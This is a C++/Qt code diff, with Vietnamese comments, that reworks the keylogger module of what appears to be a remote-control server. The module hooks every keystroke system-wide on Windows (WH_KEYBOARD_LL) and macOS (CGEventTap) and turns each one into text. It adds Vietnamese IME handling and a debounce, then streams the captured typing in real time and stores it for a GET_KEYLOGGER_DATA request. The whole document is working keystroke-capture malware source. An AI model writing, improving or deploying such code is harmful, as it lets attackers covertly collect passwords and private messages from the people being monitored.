@@ -2,6 +2,7 @@
 
 #include <QDebug>
 #include <QDateTime>
+#include <QMetaObject>
 
 #ifdef Q_OS_WIN
 #include <Windows.h>
@@ -43,6 +44,14 @@ KeyloggerModule::KeyloggerModule(QObject *parent)
     runLoopSource = nullptr;
     tapThread = nullptr;
 #endif
+
+    // Debounce timer: 50ms single-shot
+    // Nhóm các sự kiện BS+retype của Unikey/Telex thành 1 lần gửi
+    debounceTimer = new QTimer(this);
+    debounceTimer->setSingleShot(true);
+    debounceTimer->setInterval(50);
+    connect(debounceTimer, &QTimer::timeout,
+            this, &KeyloggerModule::onDebounceTimeout);
 }
 
 KeyloggerModule::~KeyloggerModule()
@@ -54,6 +63,38 @@ KeyloggerModule::~KeyloggerModule()
 }
 
 
+//---------------------------------------------------
+// Debounce: gọi khi timer 50ms hết
+// Gửi pendingChars ra ngoài qua signal
+//---------------------------------------------------
+
+void KeyloggerModule::onDebounceTimeout()
+{
+    QMutexLocker locker(&mutex);
+
+    if (!pendingChars.isEmpty())
+    {
+        QString text = pendingChars;
+        pendingChars.clear();
+        locker.unlock();
+
+        // Gửi real-time
+        emit keyTextCaptured(text);
+    }
+}
+
+
+//---------------------------------------------------
+// Bắt debounce timer (thread-safe slot)
+// Được gọi từ hook callback qua QMetaObject::invokeMethod
+//---------------------------------------------------
+
+void KeyloggerModule::startDebounce()
+{
+    debounceTimer->start(50);
+}
+
+
 //=========================================
 // WINDOWS IMPLEMENTATION
 //=========================================
@@ -62,6 +103,14 @@ KeyloggerModule::~KeyloggerModule()
 
 //---------------------------------------------------
 // Windows Keyboard Hook Callback
+//
+// Dùng WH_KEYBOARD_LL để bắt keystroke
+// Xử lý:
+// - VK_PACKET: ký tự Unicode từ IME (Unikey/EVKey)
+// - VK_BACK: backspace (Unikey gửi BS khi thay ký tự)
+// - Khác: ToUnicode() để lấy ký tự sau keyboard layout
+//
+// Kết quả: ký tự SAU KHI IME xử lý (hỗ trợ Telex)
 //---------------------------------------------------
 
 long __stdcall KeyloggerModule::keyboardProc(int nCode,
@@ -73,59 +122,114 @@ long __stdcall KeyloggerModule::keyboardProc(int nCode,
         KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
         DWORD vkCode = kbStruct->vkCode;
 
-        QString keyText;
+        // Bỏ qua các phím modifier đơn lẻ
+        if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT ||
+            vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL ||
+            vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU ||
+            vkCode == VK_CAPITAL)
+        {
+            return CallNextHookEx((HHOOK)hookHandle, nCode, wParam, lParam);
+        }
 
-        // Map virtual key code to readable string
-        switch (vkCode)
+        if (!instance) goto next;
+
+        // ── VK_BACK: Backspace ──
+        // Unikey/EVKey gửi BS để xóa ký tự cũ trước khi gửi ký tự mới
+        if (vkCode == VK_BACK)
         {
-        case VK_RETURN:   keyText = "[ENTER]"; break;
-        case VK_SPACE:    keyText = " "; break;
-        case VK_BACK:     keyText = "[BACKSPACE]"; break;
-        case VK_TAB:      keyText = "[TAB]"; break;
-        case VK_ESCAPE:   keyText = "[ESC]"; break;
-        case VK_SHIFT:
-        case VK_LSHIFT:
-        case VK_RSHIFT:   keyText = "[SHIFT]"; break;
-        case VK_CONTROL:
-        case VK_LCONTROL:
-        case VK_RCONTROL: keyText = "[CTRL]"; break;
-        case VK_MENU:
-        case VK_LMENU:
-        case VK_RMENU:    keyText = "[ALT]"; break;
-        case VK_CAPITAL:  keyText = "[CAPS]"; break;
-        case VK_DELETE:   keyText = "[DEL]"; break;
-        case VK_LEFT:     keyText = "[LEFT]"; break;
-        case VK_RIGHT:    keyText = "[RIGHT]"; break;
-        case VK_UP:       keyText = "[UP]"; break;
-        case VK_DOWN:     keyText = "[DOWN]"; break;
-        default:
+            QMutexLocker locker(&instance->mutex);
+
+            if (!instance->pendingChars.isEmpty())
+            {
+                // Xóa ký tự chưa gửi (đang trong debounce window)
+                instance->pendingChars.chop(1);
+            }
+            else
+            {
+                // Ký tự đã gửi rồi → gửi BS cho client xóa
+                instance->pendingChars += QChar('\b');
+            }
+
+            // Cập nhật keyBuffer cho GET_KEYLOGGER_DATA
+            if (!instance->keyBuffer.isEmpty())
+            {
+                instance->keyBuffer.removeLast();
+            }
+
+            // Restart debounce
+            QMetaObject::invokeMethod(instance, "startDebounce",
+                                      Qt::QueuedConnection);
+
+            return CallNextHookEx((HHOOK)hookHandle, nCode, wParam, lParam);
+        }
+
+        // ── VK_PACKET: Unicode từ SendInput (Unikey/EVKey) ──
+        if (vkCode == VK_PACKET)
         {
-            // Chuyển đổi virtual key thành ký tự
+            // scanCode chứa Unicode code point
+            QChar ch((ushort)kbStruct->scanCode);
+            QString keyText(ch);
+
+            QMutexLocker locker(&instance->mutex);
+            instance->pendingChars += keyText;
+            instance->keyBuffer.append(keyText);
+
+            QMetaObject::invokeMethod(instance, "startDebounce",
+                                      Qt::QueuedConnection);
+
+            return CallNextHookEx((HHOOK)hookHandle, nCode, wParam, lParam);
+        }
+
+        // ── VK_RETURN: Enter ──
+        if (vkCode == VK_RETURN)
+        {
+            QMutexLocker locker(&instance->mutex);
+            instance->pendingChars += "\n";
+            instance->keyBuffer.append("\n");
+
+            QMetaObject::invokeMethod(instance, "startDebounce",
+                                      Qt::QueuedConnection);
+
+            return CallNextHookEx((HHOOK)hookHandle, nCode, wParam, lParam);
+        }
+
+        // ── VK_TAB ──
+        if (vkCode == VK_TAB)
+        {
+            QMutexLocker locker(&instance->mutex);
+            instance->pendingChars += "\t";
+            instance->keyBuffer.append("\t");
+
+            QMetaObject::invokeMethod(instance, "startDebounce",
+                                      Qt::QueuedConnection);
+
+            return CallNextHookEx((HHOOK)hookHandle, nCode, wParam, lParam);
+        }
+
+        // ── Phím thường: dùng ToUnicode() ──
+        {
             BYTE keyboardState[256];
             GetKeyboardState(keyboardState);
 
             WCHAR buffer[4];
             int result = ToUnicode(vkCode, kbStruct->scanCode,
                                    keyboardState, buffer, 4, 0);
+
             if (result > 0)
             {
-                keyText = QString::fromWCharArray(buffer, result);
-            }
-            else
-            {
-                keyText = "[VK:" + QString::number(vkCode) + "]";
-            }
-            break;
-        }
-        }
+                QString keyText = QString::fromWCharArray(buffer, result);
 
-        if (instance && !keyText.isEmpty())
-        {
-            QMutexLocker locker(&instance->mutex);
-            instance->keyBuffer.append(keyText);
+                QMutexLocker locker(&instance->mutex);
+                instance->pendingChars += keyText;
+                instance->keyBuffer.append(keyText);
+
+                QMetaObject::invokeMethod(instance, "startDebounce",
+                                          Qt::QueuedConnection);
+            }
         }
     }
 
+next:
     return CallNextHookEx((HHOOK)hookHandle, nCode, wParam, lParam);
 }
 
@@ -140,22 +244,17 @@ long __stdcall KeyloggerModule::keyboardProc(int nCode,
 
 //---------------------------------------------------
 // Kiểm tra Accessibility Permission
-// macOS yêu cầu quyền "Input Monitoring" / "Accessibility"
-// trong System Settings > Privacy & Security
 //---------------------------------------------------
 
 bool KeyloggerModule::checkAccessibilityPermission()
 {
-    // AXIsProcessTrusted() kiểm tra xem app đã được cấp
-    // quyền Accessibility chưa
     bool trusted = AXIsProcessTrusted();
 
     if (!trusted)
     {
         qDebug() << "Accessibility permission NOT granted!";
-        qDebug() << "Please go to: System Settings > Privacy & Security"
-                 << "> Accessibility (or Input Monitoring)"
-                 << "and enable RemoteControlServer";
+        qDebug() << "Go to: System Settings > Privacy & Security"
+                 << "> Accessibility and enable RemoteControlServer";
     }
 
     return trusted;
@@ -164,7 +263,9 @@ bool KeyloggerModule::checkAccessibilityPermission()
 
 //---------------------------------------------------
 // CGEventTap Callback
-// Được gọi mỗi khi có keyboard event
+//
+// CGEventKeyboardGetUnicodeString trả về ký tự
+// SAU KHI macOS IME xử lý (hỗ trợ Vietnamese Telex)
 //---------------------------------------------------
 
 void* KeyloggerModule::eventCallback(void* proxy,
@@ -178,56 +279,90 @@ void* KeyloggerModule::eventCallback(void* proxy,
     CGEventRef cgEvent = (CGEventRef)event;
     CGEventType eventType = (CGEventType)type;
 
-    // Chỉ xử lý keyDown events
     if (eventType != kCGEventKeyDown)
     {
         return event;
     }
 
-    // Lấy keycode
     CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(
         cgEvent, kCGKeyboardEventKeycode);
 
-    // Lấy ký tự Unicode từ event
-    UniChar chars[4];
-    UniCharCount actualLength = 0;
-    CGEventKeyboardGetUnicodeString(
-        cgEvent, 4, &actualLength, chars);
+    if (!instance) return event;
 
-    QString keyText;
+    // ── Backspace (keyCode 51) ──
+    if (keyCode == 51)
+    {
+        QMutexLocker locker(&instance->mutex);
 
-    // Map các phím đặc biệt theo macOS keycode
-    switch (keyCode)
-    {
-    case 36:  keyText = "[ENTER]"; break;      // Return
-    case 49:  keyText = " "; break;            // Space
-    case 51:  keyText = "[BACKSPACE]"; break;   // Delete
-    case 48:  keyText = "[TAB]"; break;         // Tab
-    case 53:  keyText = "[ESC]"; break;         // Escape
-    case 117: keyText = "[DEL]"; break;         // Forward Delete
-    case 123: keyText = "[LEFT]"; break;        // Left Arrow
-    case 124: keyText = "[RIGHT]"; break;       // Right Arrow
-    case 125: keyText = "[DOWN]"; break;        // Down Arrow
-    case 126: keyText = "[UP]"; break;          // Up Arrow
-    default:
-    {
-        if (actualLength > 0)
+        if (!instance->pendingChars.isEmpty())
         {
-            keyText = QString::fromUtf16(chars, actualLength);
+            instance->pendingChars.chop(1);
         }
         else
         {
-            keyText = "[KEY:" + QString::number(keyCode) + "]";
+            instance->pendingChars += QChar('\b');
         }
-        break;
-    }
+
+        if (!instance->keyBuffer.isEmpty())
+        {
+            instance->keyBuffer.removeLast();
+        }
+
+        QMetaObject::invokeMethod(instance, "startDebounce",
+                                  Qt::QueuedConnection);
+        return event;
     }
 
-    // Lưu vào buffer
-    if (instance && !keyText.isEmpty())
+    // ── Enter (keyCode 36) ──
+    if (keyCode == 36)
     {
         QMutexLocker locker(&instance->mutex);
-        instance->keyBuffer.append(keyText);
+        instance->pendingChars += "\n";
+        instance->keyBuffer.append("\n");
+
+        QMetaObject::invokeMethod(instance, "startDebounce",
+                                  Qt::QueuedConnection);
+        return event;
+    }
+
+    // ── Tab (keyCode 48) ──
+    if (keyCode == 48)
+    {
+        QMutexLocker locker(&instance->mutex);
+        instance->pendingChars += "\t";
+        instance->keyBuffer.append("\t");
+
+        QMetaObject::invokeMethod(instance, "startDebounce",
+                                  Qt::QueuedConnection);
+        return event;
+    }
+
+    // ── Bỏ qua modifier keys ──
+    // Shift=56, Ctrl=59, Option=58, Command=55
+    if (keyCode == 56 || keyCode == 59 || keyCode == 58 ||
+        keyCode == 55 || keyCode == 54 || keyCode == 53)
+    {
+        return event;
+    }
+
+    // ── Ký tự thường: lấy Unicode từ event ──
+    {
+        UniChar chars[4];
+        UniCharCount actualLength = 0;
+        CGEventKeyboardGetUnicodeString(
+            cgEvent, 4, &actualLength, chars);
+
+        if (actualLength > 0)
+        {
+            QString keyText = QString::fromUtf16(chars, actualLength);
+
+            QMutexLocker locker(&instance->mutex);
+            instance->pendingChars += keyText;
+            instance->keyBuffer.append(keyText);
+
+            QMetaObject::invokeMethod(instance, "startDebounce",
+                                      Qt::QueuedConnection);
+        }
     }
 
     return event;
@@ -236,18 +371,16 @@ void* KeyloggerModule::eventCallback(void* proxy,
 
 //---------------------------------------------------
 // Chạy CFRunLoop trong thread riêng
-// CGEventTap cần run loop để nhận events
 //---------------------------------------------------
 
 void KeyloggerModule::runMacEventLoop()
 {
-    // Tạo event tap để theo dõi keyboard
     CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
 
     CFMachPortRef tap = CGEventTapCreate(
-        kCGSessionEventTap,          // Tap vào session events
-        kCGHeadInsertEventTap,       // Chèn vào đầu
-        kCGEventTapOptionListenOnly, // Chỉ lắng nghe, không chặn
+        kCGSessionEventTap,
+        kCGHeadInsertEventTap,
+        kCGEventTapOptionListenOnly,
         eventMask,
         (CGEventTapCallBack)eventCallback,
         nullptr
@@ -256,31 +389,23 @@ void KeyloggerModule::runMacEventLoop()
     if (!tap)
     {
         qDebug() << "Failed to create CGEventTap!";
-        qDebug() << "Make sure Accessibility permission is granted.";
         return;
     }
 
     eventTap = (void*)tap;
 
-    // Tạo run loop source từ event tap
     CFRunLoopSourceRef source = CFMachPortCreateRunLoopSource(
         kCFAllocatorDefault, tap, 0);
-
     runLoopSource = (void*)source;
 
-    // Thêm vào run loop hiện tại của thread này
     CFRunLoopAddSource(CFRunLoopGetCurrent(), source,
                        kCFRunLoopCommonModes);
-
-    // Bật event tap
     CGEventTapEnable(tap, true);
 
-    qDebug() << "macOS CGEventTap started, listening for keys...";
+    qDebug() << "macOS CGEventTap started.";
 
-    // Chạy run loop (blocking cho đến khi stop)
     CFRunLoopRun();
 
-    // Cleanup sau khi run loop dừng
     qDebug() << "macOS event loop stopped.";
 }
 
@@ -288,12 +413,8 @@ void KeyloggerModule::runMacEventLoop()
 
 
 //=========================================
-// PUBLIC METHODS (Cross-platform)
+// PUBLIC METHODS
 //=========================================
-
-//---------------------------------------------------
-// Bắt đầu ghi phím
-//---------------------------------------------------
 
 QString KeyloggerModule::startKeylogger()
 {
@@ -315,12 +436,12 @@ QString KeyloggerModule::startKeylogger()
 
     running = true;
     keyBuffer.clear();
+    pendingChars.clear();
 
     qDebug() << "Keylogger started (Windows).";
     return "SUCCESS";
 
 #elif defined(Q_OS_MACOS)
-    // Kiểm tra quyền Accessibility trước
     if (!checkAccessibilityPermission())
     {
         return "FAIL: Accessibility permission required. "
@@ -329,14 +450,12 @@ QString KeyloggerModule::startKeylogger()
     }
 
     keyBuffer.clear();
+    pendingChars.clear();
 
-    // Chạy event tap trong thread riêng
-    // (CFRunLoop cần chạy liên tục)
     tapThread = QThread::create([this]()
     {
         runMacEventLoop();
     });
-
     tapThread->start();
     running = true;
 
@@ -349,15 +468,18 @@ QString KeyloggerModule::startKeylogger()
 }
 
 
-//---------------------------------------------------
-// Dừng ghi phím
-//---------------------------------------------------
-
 QString KeyloggerModule::stopKeylogger()
 {
     if (!running)
     {
         return "FAIL: Keylogger not running";
+    }
+
+    // Flush pending chars trước khi dừng
+    if (debounceTimer->isActive())
+    {
+        debounceTimer->stop();
+        onDebounceTimeout();
     }
 
 #ifdef Q_OS_WIN
@@ -369,19 +491,14 @@ QString KeyloggerModule::stopKeylogger()
 #endif
 
 #ifdef Q_OS_MACOS
-    // Dừng event tap
     if (eventTap)
     {
         CGEventTapEnable((CFMachPortRef)eventTap, false);
     }
 
-    // Dừng run loop của thread
     if (tapThread && tapThread->isRunning())
     {
-        // CFRunLoopStop dừng CFRunLoopRun() trong thread
-        // Cần dispatch vào run loop của thread đó
         CFRunLoopStop(CFRunLoopGetMain());
-
         tapThread->quit();
         tapThread->wait(3000);
 
@@ -392,7 +509,6 @@ QString KeyloggerModule::stopKeylogger()
         }
     }
 
-    // Cleanup
     if (runLoopSource)
     {
         CFRelease((CFRunLoopSourceRef)runLoopSource);
@@ -409,15 +525,10 @@ QString KeyloggerModule::stopKeylogger()
 #endif
 
     running = false;
-
     qDebug() << "Keylogger stopped.";
     return "SUCCESS";
 }
 
-
-//---------------------------------------------------
-// Lấy dữ liệu đã ghi
-//---------------------------------------------------
 
 QString KeyloggerModule::getKeyloggerData()
 {
@@ -428,14 +539,9 @@ QString KeyloggerModule::getKeyloggerData()
         return "(No keys recorded)";
     }
 
-    QString data = keyBuffer.join("");
-    return data;
+    return keyBuffer.join("");
 }
 
-
-//---------------------------------------------------
-// Kiểm tra trạng thái
-//---------------------------------------------------
 
 bool KeyloggerModule::isRunning() const
 {
